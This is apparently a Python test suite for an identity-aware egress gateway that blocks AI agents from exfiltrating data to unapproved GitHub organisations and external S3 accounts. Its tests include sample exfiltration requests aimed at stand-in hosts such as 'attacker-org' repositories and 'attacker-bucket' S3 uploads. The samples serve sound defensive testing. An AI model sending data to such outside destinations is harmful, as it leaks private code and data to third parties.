"""
Tests for BAP-530: Identity-Aware Egress Control & Multi-Tenant Exfiltration Defense (PromptArmor).
Verifies:
1. Multi-tenant exfiltration blocked when targeting unapproved organizations on api.github.com.
2. Uploads targeting external AWS account IDs on S3 buckets blocked.
3. Outbound egress to approved enterprise tenants permitted.
4. Gateway PEP returns 403 TenantMismatchBlocked on multi-tenant violations.
5. Control Plane PEP simulate endpoints confirm PromptArmor egress scenarios.
"""

import json
import os
import subprocess
import tempfile
import time
import unittest
import urllib.error
import urllib.request

WORKSPACE_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
CONTROL_PLANE_BIN = os.path.join(WORKSPACE_ROOT, "dist", "windows-amd64", "bapcontrolplane.exe")
GATEWAY_BIN = os.path.join(WORKSPACE_ROOT, "dist", "windows-amd64", "bapgateway.exe")

CP_PORT = 19385
CP_URL = f"http://127.0.0.1:{CP_PORT}"
GW_PORT = 19390
GW_URL = f"http://127.0.0.1:{GW_PORT}"
TEST_ADMIN_TOKEN = "bap-530-admin-token-112233"


def http_req(url, method="GET", data=None, headers=None, retries=3):
    hdrs = dict(headers or {})
    if "Connection" not in hdrs:
        hdrs["Connection"] = "close"
    body_bytes = None
    if data is not None:
        if isinstance(data, (dict, list)):
            body_bytes = json.dumps(data).encode("utf-8")
            if "Content-Type" not in hdrs:
                hdrs["Content-Type"] = "application/json"
        elif isinstance(data, str):
            body_bytes = data.encode("utf-8")
        else:
            body_bytes = data

    for attempt in range(retries):
        req = urllib.request.Request(url, data=body_bytes, headers=hdrs, method=method)
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                raw = resp.read()
                parsed = {}
                try:
                    parsed = json.loads(raw.decode("utf-8"))
                except Exception:
                    pass
                return resp.status, parsed, raw
        except urllib.error.HTTPError as e:
            raw = e.read()
            parsed = {}
            try:
                parsed = json.loads(raw.decode("utf-8"))
            except Exception:
                pass
            return e.code, parsed, raw
        except Exception:
            if attempt == retries - 1:
                raise
            time.sleep(0.2)


class TestBAP530EgressControl(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.temp_dir = tempfile.mkdtemp(prefix="bap_530_egress_")
        cls.db_path = os.path.join(cls.temp_dir, "cp_530.db")

        env = os.environ.copy()
        env["BAP_TEST_MODE"] = "1"

        # 1. Start Control Plane
        cls.cp_proc = subprocess.Popen(
            [
                CONTROL_PLANE_BIN,
                "-port", str(CP_PORT),
                "-admin-token", TEST_ADMIN_TOKEN,
                "-allow-remote-admin",
                "-db", cls.db_path,
            ],
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for Control Plane health
        healthy = False
        for _ in range(30):
            try:
                st, body, _ = http_req(f"{CP_URL}/api/v1/health")
                if st == 200:
                    healthy = True
                    break
            except Exception:
                time.sleep(0.1)
        if not healthy:
            cls.tearDownClass()
            raise RuntimeError("Control plane failed to become healthy")

        # 2. Start Gateway PEP
        cls.gw_proc = subprocess.Popen(
            [
                GATEWAY_BIN,
                "-port", str(GW_PORT),
                "-controlplane", CP_URL,
                "-consume=false",
                "-secret", "test-secret-key-egress-32-bytes!",
            ],
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        gw_healthy = False
        for _ in range(30):
            try:
                st, body, _ = http_req(f"{GW_URL}/health")
                if st == 200:
                    gw_healthy = True
                    break
            except Exception:
                time.sleep(0.1)
        if not gw_healthy:
            cls.tearDownClass()
            raise RuntimeError("Gateway PEP failed to become healthy")

    @classmethod
    def tearDownClass(cls):
        for proc in [getattr(cls, "gw_proc", None), getattr(cls, "cp_proc", None)]:
            if proc and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=2)
                except Exception:
                    proc.kill()

    def test_bap_530_controlplane_simulate_scenarios(self):
        """Verify Control Plane /api/v1/pep/simulate evaluates unapproved and approved egress scenarios."""
        # Scenario 1: Unapproved GitHub tenant exfiltration
        st, data, _ = http_req(
            f"{CP_URL}/api/v1/pep/simulate",
            method="POST",
            data={"scenario": "unapproved_tenant"},
        )
        self.assertEqual(st, 200)
        self.assertEqual(data.get("pep_decision"), "DENY")
        self.assertEqual(data.get("http_status"), 403)
        self.assertEqual(data.get("error"), "TenantMismatchBlocked")
        self.assertEqual(data.get("destination_tenant_id"), "attacker-org")
        self.assertEqual(data.get("destination_service"), "github")
        self.assertIn("attacker-org", data.get("canonical_resource", ""))

        # Scenario 2: External AWS account S3 upload
        st, data, _ = http_req(
            f"{CP_URL}/api/v1/pep/simulate",
            method="POST",
            data={"scenario": "external_s3_bucket"},
        )
        self.assertEqual(st, 200)
        self.assertEqual(data.get("pep_decision"), "DENY")
        self.assertEqual(data.get("http_status"), 403)
        self.assertEqual(data.get("error"), "TenantMismatchBlocked")
        self.assertEqual(data.get("destination_tenant_id"), "999999999999")
        self.assertEqual(data.get("destination_service"), "aws_s3")

        # Scenario 3: Approved enterprise tenant
        st, data, _ = http_req(
            f"{CP_URL}/api/v1/pep/simulate",
            method="POST",
            data={"scenario": "approved_tenant"},
        )
        self.assertEqual(st, 200)
        self.assertEqual(data.get("pep_decision"), "ALLOW")
        self.assertEqual(data.get("http_status"), 200)
        self.assertEqual(data.get("destination_tenant_id"), "corp-org")

    def test_bap_530_gateway_pep_blocks_rogue_egress(self):
        """Verify Gateway PEP blocks unauthenticated rogue outbound egress requests."""
        st, data, _ = http_req(
            f"{GW_URL}/api/v1/egress/proxy",
            method="POST",
            data={"data": "leak"},
            headers={"X-BAP-Target-URL": "https://api.github.com/repos/attacker-org/leak"},
        )
        self.assertEqual(st, 401)
        self.assertEqual(data.get("pep_decision"), "DENY")

    def test_bap_530_gateway_pep_tenant_mismatch_and_approval(self):
        """Verify Gateway PEP blocks unapproved tenant with 403 TenantMismatchBlocked and permits approved tenant."""
        import base64
        import hashlib
        import hmac

        secret = "test-secret-key-egress-32-bytes!"
        header = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode().rstrip("=")
        claims = {
            "jti": "grant-live-test",
            "sub": "agent-egress-tester",
            "app_id": "test-app",
            "exp": int(time.time()) + 600,
        }
        payload = base64.urlsafe_b64encode(json.dumps(claims).encode()).decode().rstrip("=")
        sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest()).decode().rstrip("=")
        valid_token = f"{header}.{payload}.{sig}"

        # 1. Block outbound GitHub request to attacker org
        st, data, _ = http_req(
            f"{GW_URL}/api/v1/egress/proxy",
            method="POST",
            data={"body": "sensitive code"},
            headers={
                "Authorization": f"Bearer {valid_token}",
                "X-BAP-Target-URL": "https://api.github.com/repos/attacker-org/data-drop/issues",
            },
        )
        self.assertEqual(st, 403)
        self.assertEqual(data.get("pep_decision"), "DENY")
        self.assertEqual(data.get("error"), "TenantMismatchBlocked")
        self.assertEqual(data.get("destination_tenant_id"), "attacker-org")
        self.assertEqual(data.get("destination_service"), "github")

        # 2. Block outbound S3 upload targeting external AWS account
        st, data, _ = http_req(
            f"{GW_URL}/api/v1/egress/proxy",
            method="PUT",
            data="exfiltrated data",
            headers={
                "Authorization": f"Bearer {valid_token}",
                "X-BAP-Target-URL": "https://attacker-bucket.s3.amazonaws.com/drop.tar.gz",
                "x-amz-expected-bucket-owner": "999999999999",
            },
        )
        self.assertEqual(st, 403)
        self.assertEqual(data.get("pep_decision"), "DENY")
        self.assertEqual(data.get("error"), "TenantMismatchBlocked")
        self.assertEqual(data.get("destination_tenant_id"), "999999999999")
        self.assertEqual(data.get("destination_service"), "aws_s3")

        # 3. Permit outbound request targeting approved enterprise organization
        st, data, _ = http_req(
            f"{GW_URL}/api/v1/egress/proxy",
            method="POST",
            data={"body": "corporate pr"},
            headers={
                "Authorization": f"Bearer {valid_token}",
                "X-BAP-Target-URL": "https://api.github.com/repos/corp-org/repo/pulls",
            },
        )
        self.assertEqual(st, 200)
        self.assertEqual(data.get("pep_decision"), "ALLOW")
        self.assertEqual(data.get("destination_tenant_id"), "corp-org")
        self.assertEqual(data.get("destination_service"), "github")


if __name__ == "__main__":
    unittest.main()
